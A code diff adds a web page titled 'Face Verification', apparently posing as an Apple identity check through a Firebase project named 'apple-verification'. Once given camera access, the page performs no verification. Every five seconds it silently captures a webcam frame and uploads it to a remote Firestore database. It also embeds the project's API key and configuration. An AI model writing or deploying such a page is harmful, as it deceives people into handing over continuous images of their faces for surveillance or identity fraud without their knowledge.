@@ -1,0 +1,53 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Face Verification</title>
+</head>
+<body>
+  <h1>Face Verification</h1>
+  <video id="video" width="300" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+
+  <!-- Script -->
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDrWl7mPHjx0kOVPi2KrItG5Ag5q7BncO8",
+      authDomain: "apple-verification-ad80e.firebaseapp.com",
+      projectId: "apple-verification-ad80e",
+      storageBucket: "apple-verification-ad80e.firebasestorage.app",
+      messagingSenderId: "137954857845",
+      appId: "1:137954857845:web:072c0eb17ab3f59b22b93c"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const context = canvas.getContext("2d");
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+      video.srcObject = stream;
+    });
+
+    setInterval(() => {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imageData = canvas.toDataURL("image/jpeg");
+
+      db.collection("images").add({
+        imageData: imageData,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
+    }, 5000);
+  </script>
+</body>
+</html>
